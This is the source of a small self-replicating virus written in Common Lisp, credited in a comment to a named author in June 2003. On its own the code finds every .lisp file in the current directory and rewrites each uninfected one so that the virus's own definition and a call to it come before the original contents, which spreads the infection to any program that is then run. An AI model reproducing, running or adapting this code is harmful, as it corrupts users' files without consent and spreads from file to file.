;; LISP.Futhorc.b by herm1t(at)netlux.org / Jun'03
(defun virus nil (setq v 'virus)
  (dolist (f (directory "*.lisp"))
    (let (p)
      (with-open-file (i f :direction :input)
        (unless (equal (cadr (read i)) v) (file-position i 0)
          (loop
            (if (setq l (read-line i nil))
              (setq p (append p (list l))) (return)))))
      (when p
        (with-open-file (o f :direction :output)
          (format o "~S~%(~S)~%" (caadr (symbol-plist v)) v)
          (dolist (l p) (write-line l o)))))))
(virus)